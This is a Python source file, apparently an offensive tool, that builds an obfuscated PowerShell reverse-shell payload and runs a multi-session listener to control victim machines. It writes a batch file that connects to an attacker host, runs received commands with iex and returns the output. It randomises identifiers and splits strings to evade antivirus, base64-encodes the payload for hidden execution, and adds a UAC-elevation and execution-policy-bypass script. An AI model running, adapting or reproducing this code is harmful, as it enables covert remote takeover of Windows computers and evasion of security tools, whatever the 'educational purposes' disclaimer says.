import random, time, uuid, base64, argparse, subprocess, string, logging, socket, threading, importlib, subprocess, os, platform
from tqdm import tqdm

def check_install_requirements():
    try:
        importlib.import_module('tqdm')
        print("Requirements are already satisfied.")
        time.sleep(1)
    except ImportError:
        print("Installing the requirements...")
        pip_command = 'pip' if platform.system().lower() == 'windows' else 'pip3'
        subprocess.run([pip_command, 'install', '-r', '<(echo "tqdm==4.64.1")'], shell=True)
        print("Requirements installed.")

def clear_screen():
    os.system('cls' if platform.system().lower() == 'windows' else 'clear')

check_install_requirements()

clear_screen()

parser = argparse.ArgumentParser(description="Script created by AnonKryptiQuz")
parser.add_argument('-l', '-local', type=str, required=True, help='Local Machine')
parser.add_argument('-p', '-port', type=int, default=4444, help='On What Port To Connect locally')
parser.add_argument('-n', '-ngr', choices=["ngrok"], required=False, help="Ngrok tunnel")
args = parser.parse_args()

if args.p == 4444:
    print("\n[!] Note: The Default port is 4444.")
time.sleep(0.5)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_uuid():
    random_uuid = ["$" + str(uuid.uuid4()) for _ in range(10)]
    random_uid_get = random.choice(random_uuid)
    time.sleep(0.7)
    return random_uid_get

def spl_uuid():
    uuids = generate_uuid()
    split_uuid = uuids.split("-")[0]
    return split_uuid

def random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def random_choice(variables):
    return {i: random_string(random.randrange(6, 12)) for i in range(variables)}

strings = random_string(random.randrange(6, 12))
random_string_pickup = random_choice(variables=5)

Command0 = ['$str = "TcP"+"C"+"li"+"e"+"nt";', '$reversed = -join ($str[-1..-($str.Length)])']
Command1 = ['$a = IEX $env:', 'SystemRoot\SysWow64\??ndowsPowerShe??', '\\v1.0\powershe??.exe;']
Command2 = ['$client = New-Object ', 'System.Net.Sockets.', 'TCPClient("0.0.0.0",0000)']
Command3 = ['$stream = ', '$client.GetStream();', '[byte[]]$bytes = 0..65535|%{0};']
Command4 = ['while(($i = $stream.Read($bytes, 0, $bytes.Length))', '-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']
Command5 = ['$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']

WordCharSystem1 = ["SysTemROot", "Syste?????", "Syst??r??t", "SyS?em?oo?", "SYSTEmRoot", "Sys???r???"]
WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"]
WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
                   "&('N'+'e'+'w'+'-'+'O'+'b'+'J'+'e'+'c'+'t')", "NeW-oB''JeCT", "&('New'+'-ObJect')",
                   "&('N'+'e'+'w'+'-ObJect')", "&('New'+'-'+'Ob'+'je'+'ct')", "&('Ne'+'w'+'-'+'Ob'+'je'+'ct')",
                   "&('n'+'E'+'W'+'-'+'Ob'+'Je'+'ct')", "&('New'+'-'+'Ob'+'je'+'c'+'t')"]
WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
                   "Sy''St''Em.NeT.So''CkE''tS.TCpCLient", "Sy''St''Em.NeT.So''CkE''tS.$str",
                   "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')",
                   "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPcliEnt')",
                   "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets'+'.'+$str)"]
WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S'+'T'+'r'+'e'+'am')",
                   "('gEt'+'s'+'T'+'r'+'E'+'aM')", "('G'+'e'+'tStream')", "('g'+'Et'+'s'+'T'+'r'+'E'+'aM')"]
WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding",
                   "S'y's't'e'm.T'e'x't.'A'S'C'I'IE'n'c'o'd'i'n'g"]
WordCharSystem7 = ["$41b394758330c8=$3757856aa482c79977", "$37f=$91a10810c37a0f=$946c88e=$ecf0bb86",
                   "$b=$c=$9=$5=$d=$f=$c=$1=$4=$1=$4=$6=$a=$a=$2=$3=$e=$4=$3=$f=$2=$e=$a=$7=$a=$f=$0=$4=$d=$3=$1=$0",
                   "$e=$7=$f=$c=$f=$8=$e=$4=$9=$e=$3=$9=$a=$f=$3=$c=$f=$6=$a=$f=$2=$4=$6=$f=$d=$c=$f=$5=$3=$5=$d=$f"]
WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2",
                   "$b91ae5f2a05e87e53ef4ca58305c600f", "$fb3c97733989bd69eede22507aab10df"]
WordCharSystem9 = spl_uuid()

C0, C1, C2, C3, C4, C5 = map(lambda cmd: ''.join(cmd).strip(), [Command0, Command1, Command2, Command3, Command4, Command5])
W, W2, w3 = ', '.join(WordCharSystem1), ', '.join(WordCharSystem2), '. '.join(WordCharSystem3)

replacements = [random.choice(WordCharSystem1) if "SYSTEMROOT" in C1 or "SystemRoot" in C1 else None,
                random.choice(WordCharSystem2) if "SysWow64" in C1 else None,
                random.choice(WordCharSystem3) if "New-Object" in C2 else None,
                random.choice(WordCharSystem4) if "System.Net.Sockets" in C2 else None,
                random.choice(WordCharSystem5) if "GetStream" in C3 else None,
                random.choice(WordCharSystem6) if "System.Text.ASCIIEncoding" in C4 else None]

repl, repl2, repl3, repl4, repl5, repl6 = replacements
repl7 = repl8 = repl9 = None

def Banner():
    try:
        print("\nProgram made by AnonKryptiQuz. This tool is for educational purposes only.")
        print("\nCreating the payload, please wait")

        with open('Payload.bat', 'r') as file:
            spl = file.read()
            words_to_check = ["$client", "$sendback", "$data"]
            word_to_update = [repl7, repl8, repl9]
            num_words_to_check = len(words_to_check)

            exclusion_list = ["$client", "$sendback", "$data"]
            
            with tqdm(total=num_words_to_check, bar_format="{l_bar}{bar}{r_bar}") as pbar:
                for i, word in enumerate(words_to_check):
                    pbar.update(1)
                    time.sleep(0.001)
                    if word not in spl and word not in exclusion_list:
                        pbar.write(f"{i + 6}. {word} - Replaced -->> {word_to_update[i]}")
                    time.sleep(1)

        print("\nThe payload has been Generated Successfully: \n")

    except Exception as e:
        logger.error(e)

def Execute_privilege():
    with open('Privilege.bat', 'w') as run:
        run.write(privilege)

def Execute_Payload():
    with open('Payload.bat', 'w') as run2:
        run2.write(f"{C0};\n")
        run2.write('''$PJ = @("54", "43", "50", "43", "6C", "69", "65", "6E", "74");\n''')
        run2.write("$TChar = $PJ | % { [char][convert]::ToInt32($_, 16) }; $PJChar = -join $TChar;\n")
        run2.write(f";${random_string_pickup[0]} = {repl3} {repl4}('{args.l}',{args.p});\n")
        run2.write(f"${random_string_pickup[2]} = ${random_string_pickup[0]}.{repl5}();"
                   "[byte[]]$PJChar = 0..65535|%{0};\n")
        run2.write(f"while(($i = ${random_string_pickup[2]}.ReAd($PJChar, 0, $PJChar.LeNgTh)) -ne 0)" + "{;\n")
        run2.write(f"$data = ({repl3} -TypENAme {repl6}).('Ge'+'tStRinG')($PJChar,0, $i);\n")
        run2.write(f'$sendback = (iex ". {{  $data  }} 2>&1" | Ou''t-Str''ing );\n')
        run2.write(f"$J=$O=$K=$E=$R=$P=$W=$R = ${{sendback}} + 'AnonymousShell ' + (pwd).Path + '> ';\n")
        run2.write('''$s = ("{0}{1}{3}{2}"-f "se''nd","by","e","t"); $s = ([text.encoding]::ASCii).GetBYTeS($R);\n''')
        run2.write(f"${random_string_pickup[2]}.Write($s,0,$s.Length);${random_string_pickup[2]}.Flush()" + "};"
                   f"${random_string_pickup[0]}.Close()\n")

def Change_Payload(x):
    global repl7, repl8, repl9
    repl7, repl8, repl9 = random.choice(WordCharSystem7), random.choice(WordCharSystem8), WordCharSystem9
    with open(x, "r") as file:
        file_content = file.read()
    for old, new in [("$client", repl7), ("$sendback", repl8), ("sendback", repl8.split("$")[1]), ("$data", repl9)]:
        file_content = file_content.replace(old, new)
    with open(x, 'w') as file:
        file.write(file_content)

def Raw_Payload(x):
    with open(x, "r") as f:
        print(f.read())

def B64(FTD):
    with open(FTD, 'rb') as file:
        file_content = file.read()
    return base64.b64encode(file_content).decode('utf-8')

def start_server():
    sessions = {}
    hostname, port = ('0.0.0.0', args.p) if not args.n else ('0.0.0.0', int(input("[?] On which PORT to listen: ")))
    max_sessions = 5

    server_socket = socket.socket()
    server_socket.bind((hostname, port))
    server_socket.listen(5)
    print(f"\n[Anonymous] Listening on {hostname}:{port}")

    def accept_connections():
        nonlocal sessions
        while len(sessions) < max_sessions:
            client_socket, addr = server_socket.accept()
            session_id = len(sessions) + 1
            sessions[session_id] = [client_socket, addr]
            print(f"\nThe connection  has been established successfully from {addr[0]}:{addr[1]}\n")

    def handle_buffer(client_socket):
        x = b''
        while True:
            information = client_socket.recv(1024)
            x += information
            if len(information) < 1024:
                break
        return x

    threading.Thread(target=accept_connections, daemon=True).start()

    waiting_message_printed = False
    while True:
        if not sessions:
            if not waiting_message_printed:
                print(f"Waiting for the sessions...")
                waiting_message_printed = True
            continue
        elif waiting_message_printed:
            waiting_message_printed = False

        try:
            for session_id, (client_socket, session_addr) in sessions.items():
                print(f"SESSION ID::{session_id}, {session_addr[0]}::{session_addr[1]}\n")
            print(f"You may use CTRL+C for switching between the sessions")
            print(f"Press zero [0] to Kill the sessions.\n")

            userinput = int(input(f"* Please choose a session between 1-{len(sessions)}): "))
            if userinput == 0:
                print(f"\nCreated by AnonKryptiQuz")
                for _, (client_socket, _) in sessions.items():
                    client_socket.close()
                exit(0)

            if userinput in sessions:
                client_socket, addr = sessions[userinput]
                while True:
                    try:
                        command = input(f"{addr[0]}:{addr[1]} : [AnonymousSession] {userinput}> ")
                        if command.lower() == "quit":
                            client_socket.close()
                            del sessions[userinput]
                            logger.info(f"[!]User Session {userinput} lost!")
                            break
                        client_socket.send(command.encode())
                        response = handle_buffer(client_socket).decode('utf-8')
                        print(response)

                    except KeyboardInterrupt:
                        print("\n[?]Switching sessions, please wait...")
                        time.sleep(2)
                        break
                    except (ConnectionResetError, BrokenPipeError):
                        logger.info(f"[!]User session {userinput} lost!")
                        del sessions[userinput]
                        break
            else:
                logger.error("Invalid session ID.")
        except ValueError:
            print("Please enter a valid session ID or '0' to exit.")

privilege = f'''
param([switch]$Elevated)

function Test-Admin {{
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    Unblock-File '.\Privilege.bat'
}}

if ((Test-Admin) -eq $false)  {{
    if ($elevated) {{
    }} else {{
        Start-Process $env:{repl}\\\\{repl2}\\\\??ndowsPowerShe??\\\\v1.0\\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }}
    exit
}}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
'''

def main():
    Execute_privilege()
    Execute_Payload()
    Change_Payload("Payload.bat")
    Banner()
    FP = 'Payload.bat'
    B64(FTD=FP)
    time.sleep(0.5)
    print(f"* You may use powershell -w hidden -EncodedCommand [PAYLOAD]\n")
    command = "iconv -f ASCII -t UTF-16LE Payload.bat | base64 -w 0"
    base64_payload = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    base_bytes_out, base_err = base64_payload.communicate()
    encoded_command = base_bytes_out.decode('utf-8')
    print(f"powershell -e {encoded_command}")

    with open('akq.bat', 'w') as akq_file:
        akq_file.write(f"powershell -e {encoded_command}")

    time.sleep(0.5)
    start_server()

if __name__ == '__main__':
    main()
    subprocess.Popen('rm -r Payload.bat', shell=True)
